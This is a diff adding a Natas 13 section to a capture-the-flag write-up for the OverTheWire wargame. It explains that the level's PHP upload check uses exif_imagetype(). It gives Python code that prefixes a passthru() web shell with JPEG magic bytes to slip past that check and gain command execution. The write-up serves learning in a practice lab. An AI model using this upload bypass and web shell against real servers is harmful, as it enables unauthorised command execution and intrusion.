@@ -33,3 +33,35 @@ You now have code execution on the server and can simply get the flag with the f
 
 
 ![intercept](https://mbilalrizwan.github.io/MyCtfWriteups/assets/images/overthewire/natas12flag.png)
+
+
+
+
+## Natas 13
+
+Level 13 is quite similar to 12 with one minor change 
+
+Even if we use the trick we did in the last level we don't get the php file to execute on the server reason is the folloing line of code 
+
+
+```php
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    }
+```
+
+* exif_imagetype() basically checks the first few bytes of the file to verify its type.
+This is a very common way of validating uploaded files you can read more about this function on php.net forms.
+
+The following python code can help bypass this check
+
+```python
+>>> fh = open('shell.php', 'w')
+>>> fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
+>>> fh.close()
+```
+
+The above code basically makes a file which contains the passthru() function to execute commands on the server but the first few bytes of the file will make it seem like its a valid image and hense will bypass the check .
+Upload the file and  vola we have your shell.
+
+![13 flag](https://mbilalrizwan.github.io/MyCtfWriteups/assets/images/overthewire/natas13flag.png)
